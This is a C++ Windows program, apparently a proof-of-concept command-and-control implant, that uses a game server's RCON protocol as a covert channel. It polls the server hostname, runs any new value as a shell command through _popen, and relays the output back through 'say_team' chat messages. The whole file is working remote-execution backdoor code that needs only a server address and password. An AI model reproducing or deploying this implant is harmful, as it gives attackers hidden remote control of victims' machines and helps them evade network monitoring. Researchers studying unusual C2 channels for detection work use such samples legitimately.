#include <iostream>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <string>
#include <sstream>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>

#define RCON_PASS "changeme"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 27015

#pragma comment(lib, "ws2_32.lib")

std::string 
exec(
    const std::string& cmd
) 
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

std::string
getRconChallenge(
    const sockaddr_in& serverAddress
)
{
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);

    const char* command = "getchallenge";
    char rconCommand[256];
    sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command);
    sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));

    // Receive UDP response
    char buffer[48]; // sizeof challenge response
    int bytesReceived = recv(s, buffer, sizeof(buffer), 0);

    closesocket(s);

    // extract challenge from e.g. A00000000 1574936798 3 90179819134315537 1
    return std::string(buffer).substr(14, 9);
}

std::string
getHostnameFromCVARS(
    const sockaddr_in& serverAddress,
    const std::string& challenge
)
{

    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    
    std::string command = "rcon " + challenge + " " + RCON_PASS + " " + "status";

    char rconCommand[255];
    sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command.c_str());

    // Send RCON command
    sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));

    // Receive UDP response
    char cl_buffer[4096] = { 0 };
    int bytesReceived = recv(s, cl_buffer, sizeof(cl_buffer), 0);

    std::istringstream iss(cl_buffer);
    std::string line;
    std::getline(iss, line); // first line has hostname

    closesocket(s);

    return line.substr(16, line.length() - 16); // 16 = prefix length

}

int 
main() 
{
    // Setup socket 
    const wchar_t* serverIP = TEXT(SERVER_IP);
    const int serverPort = SERVER_PORT;

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(serverPort);

    InetPtonW(AF_INET, serverIP, &serverAddress.sin_addr);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
    {
        std::cout << "[!] WSAStartup failed" << std::endl;
        return 1;
    }

    // Request challenge for RCON authentication
    std::string challenge = getRconChallenge(serverAddress);
    std::cout << "[*] Received RCON challenge: " << challenge << std::endl;
    std::cout << "[*] Checked in to server @ " << SERVER_IP << ":" << SERVER_PORT << std::endl;

    // Get current server hostname
    std::string lastCommand = getHostnameFromCVARS(serverAddress, challenge);
    std::string currentCommand = lastCommand;

    // receive data to console
    while (TRUE)
    {
        // Get command from hostname
        currentCommand = getHostnameFromCVARS(serverAddress, challenge);

        // If new command to execute
        if (currentCommand != lastCommand)
        {
            // execute command 
            std::string result = exec(currentCommand);

            // Send answer to chat, line by line
            SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s == INVALID_SOCKET)
            {
                std::cout << "[!] Socket creation failed" << std::endl;
                WSACleanup();
                return 1;
            }
            
            std::istringstream iss(result);
            std::string line;
            while (std::getline(iss, line))
            {
                std::string command = "rcon " + challenge + " " + RCON_PASS + " " + "say_team " + line;
                std::cout << "[*] Sending RCON command - " << command << std::endl;
                char rconCommand[1024];
                sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command.c_str());
                sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
                Sleep(1000);
            }

            closesocket(s);
        }
        
        lastCommand = currentCommand;
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
